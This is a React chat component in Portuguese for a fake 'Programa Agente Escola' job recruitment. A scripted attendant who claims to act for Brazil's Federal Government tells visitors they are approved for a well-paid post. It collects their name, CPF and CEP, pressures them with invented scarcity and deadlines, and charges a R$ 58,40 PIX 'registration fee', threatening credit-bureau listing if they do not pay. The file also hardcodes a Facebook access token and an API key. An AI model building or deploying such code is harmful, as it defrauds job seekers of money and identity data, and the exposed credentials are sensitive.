import { useState, useEffect, useRef } from 'react';
// Facebook Pixel e UTMify
const FB_PIXEL_ID = '1338011854994081';
const FB_ACCESS_TOKEN = 'EAAPXMRw4eAcBQgfDHHywgWS48xodydySK3tqEI4Df9CF7s8aUL1N5r9AUJ0FmkcREXcfc14ZCWWSAxaPZAneJsiPIOeeudeYIGOCjXvuF8bvl1tZC3iWmKo1ZAHexFVAg11wb7ShhQxP6ITSXZCvdrXo7SE29OVN305soEmThjFAppDiKo6t0bEnxrZAxBiundkAZDZD';
const UTMIFY_API_KEY = 'Uf0hPSmaWRJWRWIfOscqQmx6s2Yw0RJtODMJ';

declare global {
  interface Window {
    fbq?: (...args: any[]) => void;
  }
}

function sendFacebookEvent(eventName: string, eventData: Record<string, any> = {}) {
  console.log('[FB PIXEL] Enviando evento:', eventName, eventData);
  // Facebook Pixel (browser)
  if (typeof window !== 'undefined') {
    if (typeof window.fbq === 'function') {
      window.fbq('trackCustom', eventName, eventData);
    } else {
      // Carrega o pixel se não estiver presente
      const script = document.createElement('script');
      script.async = true;
      script.src = 'https://connect.facebook.net/en_US/fbevents.js';
      document.head.appendChild(script);
      window.fbq = function (...args: any[]) {
        (window.fbq as any).callMethod
          ? (window.fbq as any).callMethod.apply(window.fbq, args)
          : (window.fbq as any).queue.push(args);
      };
      (window.fbq as any).queue = [];
      (window.fbq as any).loaded = true;
      (window.fbq as any).version = '2.0';
      window.fbq('init', FB_PIXEL_ID);
      window.fbq('trackCustom', eventName, eventData);
    }
  }

  // Facebook Conversion API (server)
  fetch(`https://graph.facebook.com/v18.0/${FB_PIXEL_ID}/events?access_token=${FB_ACCESS_TOKEN}`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        data: [{
          event_name: eventName,
          event_time: Math.floor(Date.now() / 1000),
          action_source: 'website',
          event_source_url: window.location.href,
          ...eventData
        }]
      })
    }
  ).then(res => res.json().then(data => {
    console.log('[FB CONVERSIONS API] Resposta:', data);
  })).catch(e => console.error('[FB CONVERSIONS API] Erro:', e));
}

function sendUtmifyEvent(eventName: string, eventData: Record<string, any> = {}) {
  console.log('[UTMIFY] Enviando evento:', eventName, eventData);
  fetch('https://api.utmify.com.br/v1/event', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-api-key': UTMIFY_API_KEY
    },
    body: JSON.stringify({
      event: eventName,
      url: window.location.href,
      ...eventData
    })
  })
    .then(res => res.json().then(data => {
      console.log('[UTMIFY] Resposta:', data);
    }))
    .catch(e => console.error('[UTMIFY] Erro:', e));
}
import { useNavigate } from 'react-router-dom';
import { createPixTransaction, type PixTransaction } from '../services/pixPaymentService';

interface UserData {
  nome?: string;
  cpf?: string;
  email?: string;
  telefone?: string;
  cep?: string;
  escola?: string;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text: string;
  options?: Array<{ id: string; text: string }>;
  isTyping?: boolean;
  emotion?: 'success' | 'warning' | 'urgency' | 'benefit' | 'trust';
  customContent?: {
    type: 'pix-qrcode';
    qrcode: string;
  };
}

export default function Chat() {
  // Ref para o container do chat
  const chatContainerRef = useRef<HTMLDivElement | null>(null);
  const navigate = useNavigate();
  // Sempre usar email e telefone fixos para o PIX
  const [userData, setUserData] = useState<UserData>({
    email: 'sdsfafsa@gmail.com',
    telefone: '69992311381',
  });
  const [messages, setMessages] = useState<Message[]>([]);
  const [progress, setProgress] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [pixTransaction, setPixTransaction] = useState<PixTransaction | null>(null);
  const conversationStarted = useRef(false);

  // Scroll automático para o final do chat ao atualizar mensagens
  useEffect(() => {
    if (chatContainerRef.current) {
      chatContainerRef.current.scrollTop = chatContainerRef.current.scrollHeight;
    }
  }, [messages]);

  useEffect(() => {
    if (conversationStarted.current) return;
    conversationStarted.current = true;

    // Sobrescreve email e telefone sempre que carregar
    const stored = localStorage.getItem('userData');
    if (stored) {
      try {
        const parsedData = JSON.parse(stored);
        setUserData({
          ...parsedData,
          email: 'sdsfafsa@gmail.com',
          telefone: '69992311381',
        });
      } catch (error) {
        setUserData({
          email: 'sdsfafsa@gmail.com',
          telefone: '69992311381',
        });
      }
    } else {
      setUserData({
        email: 'sdsfafsa@gmail.com',
        telefone: '69992311381',
      });
    }

    // Evento: finalização de compra iniciada
    sendFacebookEvent('FinalizacaoCompraIniciada');
    sendUtmifyEvent('FinalizacaoCompraIniciada');

    startConversation();
  }, []);

  const addTypingMessage = async (text: string, delay: number = 200, emotion?: Message['emotion']) => {
    // Simula tempo de digitação realista baseado no tamanho da mensagem
    return new Promise<void>(resolve => {
      const typingSpeed = 35 + Math.random() * 25; // ms por caractere
      const minDelay = 400;
      const maxDelay = 2500;
      const calcDelay = Math.min(maxDelay, Math.max(minDelay, text.length * typingSpeed));
      setTimeout(() => {
        const messageId = `msg-${Date.now()}-${Math.random()}`;
        setMessages(prev => [...prev, {
          id: messageId,
          sender: 'bot',
          text: text,
          isTyping: true,
          emotion
        }]);

        setTimeout(() => {
          setMessages(prev =>
            prev.map(msg =>
              msg.id === messageId ? { ...msg, isTyping: false } : msg
            )
          );
          resolve();
        }, calcDelay);
      }, delay + Math.random() * 200);
    });
  };

  const startConversation = async () => {
    setProgress(1);

    await addTypingMessage('Olá! Que alegria tê-lo aqui!', 300, 'benefit');
    await addTypingMessage('Sou a Mariana do Programa Agente Escola, iniciativa vinculada ao Governo Federal.', 200, 'trust');
    await addTypingMessage('Estou aqui para confirmar seus dados finais e liberar o acesso à etapa oficial de inscrição.', 200, 'benefit');
    await addTypingMessage('Leva menos de 2 minutos. Vamos?', 200);

    await new Promise<void>(resolve => {
      setTimeout(() => {
        const msg: Message = {
          id: `step-1-${Date.now()}`,
          sender: 'bot',
          text: 'Podemos continuar agora?',
          options: [
            { id: 'continue', text: 'Sim! Continuar' },
            { id: 'later', text: 'Prefiro depois' }
          ],
          isTyping: false
        };
        setMessages(prev => [...prev, msg]);
        resolve();
      }, 200);
    });
  };

  const handleSelectOption = async (optionId: string, optionText: string) => {
    setMessages(prev => {
      const updated = [...prev];
      const lastIdx = updated.length - 1;
      if (updated[lastIdx]?.options) {
        updated[lastIdx] = { ...updated[lastIdx], options: undefined };
      }
      return updated;
    });

    setMessages(prev => [...prev, {
      id: `user-${Date.now()}`,
      sender: 'user',
      text: optionText
    }]);

    setIsLoading(true);

    if (optionId === 'later') {
      await addTypingMessage('Sem problema! Mas lembre: sua vaga ficará reservada por tempo limitado.', 200, 'urgency');
      await addTypingMessage('Recomendo voltar em breve para não perder essa oportunidade!', 200, 'urgency');
      setIsLoading(false);
      return;
    }

    if (optionId === 'continue') {
      await new Promise(resolve => setTimeout(resolve, 600));
      setProgress(2);

      await addTypingMessage('Fantástico! Você está muito perto!', 300, 'success');
      await addTypingMessage('Confira os principais pontos que você conquistou com a aprovação:', 200, 'benefit');
      
      await addTypingMessage(
        'Remuneração: R$ 3.456,13/mês (ACIMA da média nacional)\n' +
        'Atuação em escola pública próxima à sua residência\n' +
        'Capacitação gratuita com certificado nacional\n' +
        'Vale alimentação, plano de saúde e seguro de vida\n' +
        'Progressão de carreira garantida',
        200,
        'benefit'
      );
      
      await addTimerMessage('ATENÇÃO:', '5000 candidatos disputam as vagas. Sua aprovação é especial!', 'urgency');

      await new Promise<void>(resolve => {
        setTimeout(() => {
          const msg: Message = {
            id: `step-2-${Date.now()}`,
            sender: 'bot',
            text: 'Vamos confirmar seus dados agora?',
            options: [
              { id: 'confirm-data', text: 'Sim! Confirmar meus dados' },
              { id: 'cancel', text: 'Cancelar' }
            ],
            isTyping: false,
            emotion: 'benefit'
          };
          setMessages(prev => [...prev, msg]);
          resolve();
        }, 200);
      });

      setIsLoading(false);
      return;
    }

    if (optionId === 'confirm-data') {
      await new Promise(resolve => setTimeout(resolve, 600));
      setProgress(3);

      await addTypingMessage('Excelente! Aqui está seu resumo:', 300, 'success');

      const nomeExibido = userData.nome ? userData.nome.toUpperCase() : 'NÃO INFORMADO';
      const cpfExibido = userData.cpf ? `${userData.cpf.slice(0, 3)}.${userData.cpf.slice(3, 6)}.${userData.cpf.slice(6, 9)}-${userData.cpf.slice(9)}` : 'NÃO INFORMADO';
      const cepExibido = userData.cep ? `${userData.cep.slice(0, 5)}-${userData.cep.slice(5)}` : 'NÃO INFORMADO';

      await addTypingMessage(
        `SEU PERFIL APROVADO:\n\n` +
        `Nome: ${nomeExibido}\n` +
        `CPF: ${cpfExibido}\n` +
        `CEP: ${cepExibido}\n` +
        `Programa: Agente Escola do Futuro\n` +
        `Seu salário: R$ 3.456,13 mensais\n` +
        `Status: PRÉ-INSCRIÇÃO APROVADA (99% de chance de aprovação final!)`,
        200,
        'success'
      );

      await addTimerMessage('IMPORTANTE:', 'Seus dados estão VALIDADOS e SEGUROS. Protegidos pela LGPD!', 'trust');

      await addTypingMessage('Está tudo correto?', 200);

      await new Promise<void>(resolve => {
        setTimeout(() => {
          const msg: Message = {
            id: `step-3-${Date.now()}`,
            sender: 'bot',
            text: '',
            options: [
              { id: 'data-ok', text: 'Sim! Está perfeito' },
              { id: 'data-change', text: 'Preciso alterar' }
            ],
            isTyping: false
          };
          setMessages(prev => [...prev, msg]);
          resolve();
        }, 200);
      });

      setIsLoading(false);
      return;
    }

    if (optionId === 'data-ok') {
      await new Promise(resolve => setTimeout(resolve, 600));

      await addTypingMessage('PERFEITO! Seus dados foram VALIDADOS COM SUCESSO!', 300, 'success');
      
      await addTimerMessage('FATO IMPORTANTE:', 'Você passou por 3 etapas de análise e foi aprovado!\nVocê está entre os 5% de candidatos mais qualificados!', 'success');

      await addTypingMessage('Agora vem a etapa final que libera tudo...', 200);
      
      await addTypingMessage('A TAXA DE INSCRIÇÃO é obrigatória para:', 200, 'warning');
      await addTypingMessage(
        'Garantir sua vaga (sistema libera automaticamente se não pagar)\n' +
        'Organizar a prova presencial no seu estado\n' +
        'Emitir seu certificado oficial\n' +
        'Alocar você na melhor escola pública\n' +
        'Processar e validar sua inscrição',
        200,
        'trust'
      );

      await addTimerMessage('VOCÊ SABIA?', 'A maioria dos candidatos que fazem essa inscrição recebem a convocação em até 30 dias!', 'benefit');

      await addTypingMessage('A taxa é de apenas R$ 58,40 (processamento PIX)', 200);
      
      await addTimerMessage('ATENÇÃO URGENTE!', 'Sua pré-inscrição ficará reservada por TEMPO LIMITADO.\nApós esse período, a vaga é liberada para o próximo candidato.\nRecomendo finalizar AGORA para não perder!', 'urgency');

      await new Promise<void>(resolve => {
        setTimeout(() => {
          const msg: Message = {
            id: `final-${Date.now()}`,
            sender: 'bot',
            text: 'VOCÊ ESTÁ MUITO PERTO DA SUA OPORTUNIDADE!\n\nClique abaixo para gerar o PIX e FINALIZAR sua inscrição:',
            options: [
              { id: 'pix-final', text: 'GERAR PIX - FINALIZAR INSCRIÇÃO' },
              { id: 'cancel-final', text: 'Cancelar' }
            ],
            isTyping: false,
            emotion: 'urgency'
          };
          setMessages(prev => [...prev, msg]);
          resolve();
        }, 200);
      });

      setIsLoading(false);
      return;
    }

    if (optionId === 'pix-final') {
      // Evento: Purchase (compra/pagamento iniciado)
      sendFacebookEvent('P1urchase');
      sendUtmifyEvent('P1urchase');
      setIsLoading(true);
      await addTypingMessage('Gerando seu PIX oficial...', 300, 'success');
      
      try {
        // Validar dados do usuário
        console.log('userData completo:', userData);
        
        if (!userData.nome || !userData.cpf || !userData.email || !userData.telefone) {
          console.error('Dados incompletos:', {
            nome: userData.nome,
            cpf: userData.cpf,
            email: userData.email,
            telefone: userData.telefone
          });
          throw new Error('Dados do usuário incompletos. Por favor, volte e preencha o formulário novamente.');
        }

        // Chamar a API para gerar o PIX
        const transaction = await createPixTransaction({
          customer: {
            name: userData.nome,
            email: userData.email,
            phone: userData.telefone,
            cpf: userData.cpf,
          },
          amount: 5840, // R$ 58,40 em centavos
          externalId: `inscricao-${userData.cpf}-${Date.now()}`,
          expiresInDays: 1,
        });
        
        setPixTransaction(transaction);
        
        await addTypingMessage('✅ PIX gerado com sucesso!', 200, 'success');
        await addTypingMessage(
          ` Valor: R$ 58,40\n⏰ Válido até: ${new Date(transaction.pix.expirationDate).toLocaleDateString('pt-BR')}\n\n📱 Como pagar:\n1️⃣ Abra o app do seu banco\n2️⃣ Toque em PIX\n3️⃣ Escolha "QR Code" ou "Copiar código"\n4️⃣ Use o QR abaixo ou copie o código\n5️⃣ Confirme o pagamento\n\n🔒 Seu pagamento é seguro e protegido!\n\nO não pagamento implicará na inscrição deste documento em Dívida Ativa e nos órgãos de proteção ao crédito (SPC/Serasa).`,
          200,
          'benefit'
        );
        
        // Exibir QR Code visual + opções
        await new Promise<void>(resolve => {
          setTimeout(() => {
            const msg: Message = {
              id: `pix-display-${Date.now()}`,
              sender: 'bot',
              text: '✅ Seu QR Code PIX está pronto!\n\nEscolha uma opção abaixo:',
              options: [
                { id: 'pix-copy', text: '📋 Copiar código PIX' },
                { id: 'pix-paid', text: '✅ Já paguei' },
                { id: 'pix-cancel', text: '❌ Cancelar' }
              ],
              isTyping: false,
              emotion: 'benefit',
              customContent: {
                type: 'pix-qrcode',
                qrcode: transaction.pix.qrcode
              }
            };
            setMessages(prev => [...prev, msg]);
            resolve();
          }, 200);
        });
        
      } catch (error) {
        console.error('Erro ao gerar PIX:', error);
        
        let errorMessage = 'Desculpe, houve um erro ao gerar o PIX.\n\nPor favor, tente novamente ou entre em contato com o suporte.';
        
        if (error instanceof Error) {
          errorMessage = `❌ Erro: ${error.message}\n\nPor favor, tente novamente ou entre em contato com o suporte.`;
          console.error('Detalhes do erro:', error.message);
        }
        
        await addTypingMessage(errorMessage, 300, 'urgency');
      }
      
      setIsLoading(false);
      return;
    }

    if (optionId === 'pix-paid') {
      await addTypingMessage('✅ Obrigado pelo pagamento!', 200, 'success');
      await addTypingMessage('Sua inscrição foi confirmada com sucesso! 🎉', 200, 'success');
      await addTypingMessage('Você receberá um email de confirmação em breve.', 200, 'benefit');
      setIsLoading(false);
      return;
    }

    if (optionId === 'pix-copy') {
      if (pixTransaction) {
        navigator.clipboard.writeText(pixTransaction.pix.qrcode);
        await addTypingMessage(
          '📋 ✅ CÓDIGO PIX COPIADO COM SUCESSO!',
          200,
          'success'
        );
        await addTypingMessage(
          `📱 Como pagar:\n1️⃣ Abra o app do seu banco\n2️⃣ Toque em PIX\n3️⃣ Escolha "QR Code" ou "Copiar código"\n4️⃣ Use o QR abaixo ou copie o código\n5️⃣ Confirme o pagamento`,
          200,
          'benefit'
        );
      }
      setIsLoading(false);
      return;
    }

    if (optionId === 'pix-cancel') {
      await addTypingMessage('Sem problema! Você pode retomar quando quiser.', 200);
      await addTimerMessage('⏰ LEMBRETE:', 'Mas lembre-se: sua vaga é por tempo limitado!\nVolte em breve para não perder essa oportunidade! 🌟', 'urgency');
      setIsLoading(false);
      return;
    }

    if (optionId === 'cancel-final' || optionId === 'cancel' || optionId === 'data-change') {
      await addTypingMessage('Sem problema! Você pode retomar quando quiser.', 200);
      await addTimerMessage('LEMBRETE:', 'Mas lembre-se: sua vaga é por tempo limitado!\nVolte em breve para não perder essa oportunidade!', 'urgency');
      setIsLoading(false);
      return;
    }

    setIsLoading(false);
  };

  const addTimerMessage = async (title: string, text: string, emotion?: Message['emotion']) => {
    return new Promise<void>(resolve => {
      setTimeout(() => {
        const messageId = `timer-${Date.now()}-${Math.random()}`;
        setMessages(prev => [...prev, {
          id: messageId,
          sender: 'bot',
          text: `${title}\n${text}`,
          isTyping: false,
          emotion
        }]);
        resolve();
      }, 300);
    });
  };

  const handleBackClick = ()    => {
    navigate(-1);
  };

  const getEmotionColor = (emotion?: Message['emotion']) => {
    switch (emotion) {
      case 'success':
        return 'bg-green-50 border-l-4 border-green-500';
      case 'warning':
        return 'bg-yellow-50 border-l-4 border-yellow-500';
      case 'urgency':
        return 'bg-red-50 border-l-4 border-red-500';
      case 'benefit':
        return 'bg-blue-50 border-l-4 border-blue-500';
      case 'trust':
        return 'bg-purple-50 border-l-4 border-purple-500';
      default:
        return 'bg-gray-100';
    }
  };

  const getEmotionBg = (emotion?: Message['emotion']) => {
    switch (emotion) {
      case 'success':
        return 'bg-green-100 text-green-900';
      case 'warning':
        return 'bg-yellow-100 text-yellow-900';
      case 'urgency':
        return 'bg-red-100 text-red-900';
      case 'benefit':
        return 'bg-blue-100 text-blue-900';
      case 'trust':
        return 'bg-purple-100 text-purple-900';
      default:
        return 'bg-gray-100 text-gray-900';
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 pb-20">
      <div className="max-w-lg mx-auto">
        <div className="flex items-center gap-4 mb-6">
          <button
            onClick={handleBackClick}
            className="text-foreground hover:opacity-80 transition-opacity"
          >
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
            </svg>
          </button>
          <h1 className="text-lg font-semibold">Voltar</h1>
        </div>

  <div className="rounded-xl border-0 shadow-lg overflow-hidden sticky top-4 flex flex-col h-[70vh] bg-white">
          <div className="p-4" style={{ background: 'linear-gradient(135deg, #0A5E4E 0%, #1B4965 50%, #2d3748 100%)' }}>
            <div className="flex items-center gap-3">
              <img src="https://i.ibb.co/nMPCFGk7/atendnte.jpg" alt="Mariana Oliveira" className="w-14 h-14 rounded-full flex-shrink-0 border-2 border-white/40 object-cover" />
              <div className="text-white">
                <h2 className="font-bold text-lg">Mariana Oliveira</h2>
                <p className="text-sm text-white/90"> Atendimento - Concurso Agente Escola </p>
              </div>
            </div>
          </div>

          <div className="p-4 bg-gradient-to-r from-green-50 to-blue-50 border-b-2 border-green-200">
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm text-gray-700 font-bold"> Seu Progresso</span>
              <span className="text-lg font-bold bg-gradient-to-r from-green-600 to-blue-600 bg-clip-text text-transparent">{progress}/3</span>
            </div>
            <div className="h-3 bg-gray-300 rounded-full overflow-hidden shadow-inner">
              <div
                className="h-full transition-all duration-700 ease-out shadow-lg"
                style={{
                  width: `${(progress / 3) * 100}%`,
                  background: 'linear-gradient(90deg, #10b981, #3b82f6, #8b5cf6)'
                }}
              />
            </div>
          </div>

          <div
            className="flex-1 overflow-y-auto p-4 space-y-4"
            ref={chatContainerRef}
          >
            {messages.map((message, index) => (
              <div key={message.id}>
                <div
                  className={`flex items-start gap-3 ${message.sender === 'user' ? 'justify-end' : ''}`}
                >
                  {message.sender === 'bot' && (
                    <img src="https://i.ibb.co/nMPCFGk7/atendnte.jpg" alt="Mariana" className="w-8 h-8 rounded-full flex-shrink-0 shadow-md object-cover" />
                  )}
                  <div
                    className={`max-w-[75%] rounded-xl px-4 py-3 shadow-md ${
                      message.sender === 'bot'
                        ? getEmotionColor(message.emotion) + ' ' + getEmotionBg(message.emotion)
                        : 'bg-gradient-to-br from-blue-500 to-blue-600 text-white font-medium'
                    }`}
                  >
                    <p className="text-sm whitespace-pre-wrap leading-relaxed font-medium">{message.text}</p>

                    {message.customContent?.type === 'pix-qrcode' && (
                      <div className="mt-4 flex flex-col items-center gap-2">
                        <div className="text-xs bg-yellow-300 text-gray-900 p-2 rounded font-bold cursor-pointer hover:bg-yellow-400 transition-colors break-all max-w-xs text-center"
                          onClick={() => {
                            navigator.clipboard.writeText(message.customContent?.qrcode || '');
                          }}
                          title="Clique para copiar o código completo"
                        >
                          {message.customContent.qrcode.substring(0, 48)}...
                        </div>
                        <img
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=100x100&data=${encodeURIComponent(message.customContent.qrcode)}`}
                          alt="QR Code PIX"
                          className="w-24 h-24 border-2 border-white rounded-lg shadow-lg"
                        />
                      </div>
                    )}

                    {message.isTyping && (
                      <div className="flex gap-1 mt-2">
                        <span className="w-2 h-2 bg-current rounded-full animate-bounce"></span>
                        <span className="w-2 h-2 bg-current rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></span>
                        <span className="w-2 h-2 bg-current rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></span>
                      </div>
                    )}
                  </div>
                </div>

                {message.options && index === messages.length - 1 && (
                  <div className="flex flex-col gap-3 mt-4 ml-0">
                    {message.options.map(option => {
                      const isGreen = option.id.includes('pix') || option.id === 'confirm-data' || option.id === 'continue' || option.id === 'data-ok';
                      return (
                        <button
                          key={option.id}
                          onClick={() => handleSelectOption(option.id, option.text)}
                          disabled={isLoading}
                          className={`text-left px-4 py-3 rounded-lg font-bold transition-all transform hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed text-sm shadow-lg w-full ${
                            isGreen ? 'bg-gradient-to-r from-green-500 to-green-600 text-white hover:from-green-600 hover:to-green-700 border-2 border-green-400 animate-pulse-slow' :
                            option.id === 'pix-copy'
                              ? 'bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 hover:from-yellow-500 hover:to-yellow-600 border-2 border-yellow-300'
                              : 'bg-gray-100 text-gray-800 hover:bg-gray-200 border-2 border-gray-300'
                          }`}
                          style={isGreen ? {
                            animationDuration: '2.2s',
                            animationIterationCount: 'infinite',
                            animationTimingFunction: 'ease-in-out',
                          } : {}}
                        >
                          {option.text}
                        </button>
                      );
                    })}
                  </div>
                )}
              </div>
            ))}
          </div>
          {/* Frase removida do card, vai para o fundo */}
        </div>
      </div>
      {/* Frase de segurança no fundo da página, fora do card */}
      <div className="mt-8 text-center text-xs text-gray-600 px-4 space-y-1">
        <p className="font-bold">Seus dados são 100% seguros</p>
        <p>Sistema oficial do Programa Agente Escola do Futuro</p>
        <p>Protegido pela Lei Geral de Proteção de Dados (LGPD)</p>
      </div>
    </div>
  );
}
